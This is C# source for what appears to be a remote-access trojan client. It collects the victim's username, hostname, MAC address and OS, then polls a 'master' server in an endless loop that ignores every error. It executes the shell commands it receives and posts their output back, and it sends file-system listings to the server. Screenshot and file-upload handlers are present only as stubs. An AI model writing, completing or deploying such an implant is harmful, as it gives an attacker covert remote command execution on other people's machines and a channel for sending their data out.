using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TestAPP.lib;

namespace TestAPP
{
    internal class Program
    {
        static void Main(string[] args)
        {
            SystemInfo sysInfo = SysInfoGrabber.getSystemInfo();
            obeyMaster(sysInfo);
        }

        static String getCommandJSONFromSysInfo(SystemInfo sysInfo)
        {
            JSONHolder json = new JSONHolder();
            json.addStringEntry("username", sysInfo.username);
            json.addStringEntry("hostname", sysInfo.hostName);
            json.addStringEntry("mac", sysInfo.macAddress);
            json.addStringEntry("os", sysInfo.operatingSystem);
            json.addStringEntry("ostype", "WIN");

            return json.getParsedJSONString();

        }


        static void runShell(SystemInfo sysInfo, String command)
        {
            Console.WriteLine("[+] Executing SHELL Command : " + command);
            String payload = ShellCommandUtil.getCommandOutputJSON(sysInfo.macAddress, command);
            WebClient.sendPostJSON(Constants.API_SLAVE_TEXT_RESPONSE_URL, payload);
        }

        static void getScreenShot(SystemInfo sysInfo, String command)
        {
            Console.WriteLine("[+] Taking Screenshot for Master");
        }

        static void uploadFileToMaster(SystemInfo sysInfo, String command)
        {
            Console.WriteLine("[+] Uploading File to Master");
        }

        static void browseFileSystem(SystemInfo sysInfo, String command)
        {
            Console.WriteLine("[+] Browsing FileSystem");
            Console.WriteLine("[+] Command is " + command);
            String payload = FileSystemUtil.getFilesNFolders(sysInfo, command);
            Console.WriteLine("Payload is ");
            Console.WriteLine(payload);
            WebClient.sendPostJSON(Constants.API_SLAVE_FILEBROWSE_RESPONSE_URL, payload);
        }

        static void connectToMaster(SystemInfo sysInfo)
        {
            JSONHolder json = new JSONHolder();
            String commandJSON = getCommandJSONFromSysInfo(sysInfo);
            Console.WriteLine("[+] Getting Command From Master...");
            String serverResponse = WebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);
            Console.WriteLine("Server Response is ");
            Console.WriteLine(serverResponse);

            if (serverResponse == "{}")
            {
                Console.WriteLine("[+] Nothing to do...");
                System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
                return;
            }

            Hashtable responseMap = json.getMappedObjectFromString(serverResponse);

            switch (HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_TYPE))
            {
                case Constants.SLAVE_COMMAND_KEY_VALUE_SHELL:
                    runShell(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                    break;
                case Constants.SLAVE_COMMAND_KEY_VALUE_SCREENSHOT:
                    getScreenShot(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                    break;
                case Constants.SLAVE_COMMAND_KEY_VALUE_FILEBROWSE:
                    browseFileSystem(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                    break;
                case Constants.SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD:
                    uploadFileToMaster(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
                    break;
            }

            System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
        }
        static void obeyMaster(SystemInfo sysInfo)
        {
            
            while (true)
            {
                try
                {
                    connectToMaster(sysInfo);
                }
                catch (Exception e)
                {
                }
                
            }
        }
    }
}
